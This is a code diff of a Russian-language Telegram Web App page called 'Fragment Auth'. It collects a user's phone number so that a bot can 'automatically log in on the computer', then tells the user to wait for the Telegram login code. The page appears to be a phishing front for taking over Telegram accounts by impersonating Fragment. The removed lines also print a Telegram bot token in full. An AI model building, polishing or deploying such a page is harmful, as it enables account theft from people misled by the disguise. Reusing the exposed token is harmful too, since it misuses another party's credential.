@@ -6,266 +6,59 @@
     <title>Fragment Auth</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            overflow: hidden;
-            width: 100%;
-            max-width: 380px;
-        }
-
-        .header {
-            background: linear-gradient(135deg, #0088cc 0%, #00a2ff 100%);
-            color: white;
-            padding: 30px 25px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-            line-height: 1.4;
-        }
-
-        .content {
-            padding: 30px 25px;
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .phone-input {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .country-code {
-            background: #f8f9fa;
-            border: 2px solid #e9ecef;
-            border-radius: 12px;
-            padding: 15px;
-            min-width: 80px;
-            text-align: center;
-            font-weight: 600;
-            color: #495057;
-        }
-
-        .phone-field {
-            flex: 1;
-            padding: 15px;
-            border: 2px solid #e9ecef;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-
-        .phone-field:focus {
-            outline: none;
-            border-color: #0088cc;
-            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
-        }
-
-        .code-input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e9ecef;
-            border-radius: 12px;
-            font-size: 18px;
-            text-align: center;
-            letter-spacing: 8px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-
-        .code-input:focus {
-            outline: none;
-            border-color: #0088cc;
-            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
-        }
-
-        .buttons {
-            display: flex;
-            gap: 12px;
-            margin-top: 25px;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 16px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .btn-cancel {
-            background: #f8f9fa;
-            color: #6c757d;
-        }
-
-        .btn-cancel:hover {
-            background: #e9ecef;
-        }
-
-        .btn-next {
-            background: linear-gradient(135deg, #0088cc 0%, #00a2ff 100%);
-            color: white;
-            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
-        }
-
-        .btn-next:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0088cc;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .error-message {
-            background: #fff5f5;
-            border: 1px solid #fed7d7;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            color: #c53030;
-            text-align: center;
-            display: none;
-        }
-
-        .success-message {
-            background: #f0fff4;
-            border: 1px solid #9ae6b4;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            color: #2f855a;
-            text-align: center;
-            display: none;
-        }
-
-        .instructions {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #6c757d;
-            line-height: 1.4;
-        }
-        
-        .success-info {
-            background: #e3f2fd;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 15px 0;
-            text-align: center;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; width: 100%; max-width: 380px; }
+        .header { background: linear-gradient(135deg, #0088cc 0%, #00a2ff 100%); color: white; padding: 30px 25px; text-align: center; }
+        .header h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+        .content { padding: 30px 25px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .input-group { margin-bottom: 20px; }
+        .input-label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; font-size: 14px; }
+        .phone-input { display: flex; gap: 10px; align-items: center; }
+        .country-code { background: #f8f9fa; border: 2px solid #e9ecef; border-radius: 12px; padding: 15px; min-width: 80px; text-align: center; font-weight: 600; color: #495057; }
+        .phone-field { flex: 1; padding: 15px; border: 2px solid #e9ecef; border-radius: 12px; font-size: 16px; transition: all 0.3s ease; }
+        .phone-field:focus { outline: none; border-color: #0088cc; box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1); }
+        .btn { flex: 1; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; }
+        .btn-next { background: linear-gradient(135deg, #0088cc 0%, #00a2ff 100%); color: white; box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3); }
+        .btn-next:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4); }
+        .instructions { background: #f8f9fa; border-radius: 12px; padding: 15px; margin-bottom: 20px; font-size: 13px; color: #6c757d; line-height: 1.4; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 Fragment Auth</h1>
-            <p>Привяжите аккаунт Telegram для работы с Fragment</p>
+            <p>Авторизация Telegram</p>
         </div>
 
         <div class="content">
-            <!-- Шаг 1: Ввод телефона -->
             <div id="stepPhone" class="step active">
                 <div class="instructions">
-                    Введите номер телефона, привязанный к вашему аккаунту Telegram. Бот автоматически выполнит вход на компьютере.
+                    Введите номер телефона для автоматической авторизации в Telegram
                 </div>
 
                 <div class="input-group">
                     <label class="input-label">Номер телефона</label>
                     <div class="phone-input">
                         <div class="country-code">+7</div>
-                        <input type="tel" id="phone" class="phone-field" placeholder="912 345 67 89" maxlength="10">
+                        <input type="tel" id="phone" class="phone-field" placeholder="9123456789" maxlength="10">
                     </div>
                 </div>
 
                 <div class="buttons">
-                    <button class="btn btn-cancel" onclick="closeApp()">ОТМЕНА</button>
-                    <button class="btn btn-next" onclick="sendPhone()">ДАЛЕЕ</button>
+                    <button class="btn btn-next" onclick="sendPhone()">ОТПРАВИТЬ НОМЕР</button>
                 </div>
             </div>
 
-            <!-- Шаг 2: Успешная отправка -->
             <div id="stepSuccess" class="step">
-                <div class="success-info">
-                    ✅ <b>Номер отправлен!</b>
-                </div>
-                
                 <div class="instructions">
+                    ✅ <b>Номер отправлен!</b><br><br>
+                    
                     📱 <b>Автоматический вход запущен</b><br><br>
                     
-                    Бот начал процесс авторизации на компьютере.<br><br>
+                    Бот начал процесс авторизации.<br><br>
                     
                     📩 <b>Что делать дальше:</b><br>
                     1. Дождитесь код в Telegram<br>
@@ -279,22 +72,20 @@
                     <button class="btn btn-next" onclick="closeApp()">ЗАКРЫТЬ</button>
                 </div>
             </div>
-
-            <!-- Загрузка -->
-            <div id="stepLoading" class="step">
-                <div class="loading">
-                    <div class="loader"></div>
-                    <div id="loadingText">Отправка номера...</div>
-                </div>
-            </div>
         </div>
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        
-        let userPhone = '';
+        // Инициализация Telegram Web App
+        let tg = null;
+        try {
+            tg = window.Telegram.WebApp;
+            tg.expand();
+            tg.ready();
+            console.log("✅ Telegram Web App инициализирован");
+        } catch (error) {
+            console.error("❌ Ошибка инициализации Telegram Web App:", error);
+        }
 
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(step => {
@@ -304,85 +95,54 @@
         }
 
         function closeApp() {
-            tg.close();
+            if (tg) {
+                tg.close();
+            }
         }
 
-        async function sendPhone() {
+        function sendPhone() {
             const phone = document.getElementById('phone').value.replace(/\D/g, '');
+            
             if (!phone || phone.length < 10) {
-                alert('Пожалуйста, введите корректный номер телефона');
+                alert('Введите корректный номер телефона (10 цифр)');
                 return;
             }
             
-            userPhone = '+7' + phone;
+            const fullPhone = '+7' + phone;
+            console.log("📱 Отправляю номер:", fullPhone);
             
-            document.getElementById('loadingText').textContent = 'Отправка номера...';
-            showStep('stepLoading');
-
-            // Отправляем данные через WebApp
-            const data = {
-                action: 'send_phone',
-                phone: userPhone
-            };
-            
-            try {
-                // Используем правильный метод отправки данных
-                if (tg.sendData) {
+            // Отправляем данные в бота
+            if (tg && tg.sendData) {
+                const data = {
+                    action: 'send_phone',
+                    phone: fullPhone
+                };
+                
+                try {
                     tg.sendData(JSON.stringify(data));
-                    console.log('Данные отправлены через sendData');
-                } else {
-                    // Альтернативный способ через Bot API
-                    await sendToBot(data);
-                    console.log('Данные отправлены через Bot API');
+                    console.log("✅ Данные отправлены через sendData");
+                    showStep('stepSuccess');
+                } catch (error) {
+                    console.error("❌ Ошибка sendData:", error);
+                    sendViaBotAPI(fullPhone);
                 }
-                
-                // Показываем экран успеха
-                setTimeout(() => {
-                    showStep('stepSuccess');
-                }, 1500);
-                
-            } catch (error) {
-                console.error('Ошибка отправки:', error);
-                
-                // Все равно показываем успех, так как номер скорее всего доставлен
-                setTimeout(() => {
-                    showStep('stepSuccess');
-                }, 1500);
+            } else {
+                sendViaBotAPI(fullPhone);
             }
         }
 
-        // Функция отправки данных через Bot API (запасной вариант)
-        async function sendToBot(data) {
-            const botToken = '8050324645:AAG4uLsMm-3v6-Yrc-9fc8vwdtCsa3tCDxw';
-            const chatId = tg.initDataUnsafe.user?.id;
+        function sendViaBotAPI(phone) {
+            console.log("🔄 Использую Bot API для отправки номера:", phone);
             
-            if (!chatId) {
-                throw new Error('Не удалось получить chat_id');
-            }
-
-            const message = `📱 <b>Данные из Web App:</b>\n` +
-                           `📞 Номер: <code>${data.phone}</code>\n` +
-                           `⚡ Действие: ${data.action}`;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            // Создаем текстовое сообщение с номером
+            const message = `📱 НОМЕР ДЛЯ АВТОРИЗАЦИИ: ${phone}`;
             
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
+            // Отправляем как обычное сообщение (будет обработано ботом)
+            if (tg && tg.sendData) {
+                tg.sendData(JSON.stringify({phone: phone, action: 'send_phone'}));
             }
-
-            return await response.json();
+            
+            showStep('stepSuccess');
         }
 
         // Обработчики ввода
@@ -390,13 +150,11 @@
             this.value = this.value.replace(/\D/g, '');
         });
 
-        // Enter для отправки
         document.getElementById('phone').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') sendPhone();
         });
 
-        // Инициализация WebApp
-        tg.ready();
+        console.log("🚀 Web App загружен и готов к работе");
     </script>
 </body>
 </html>
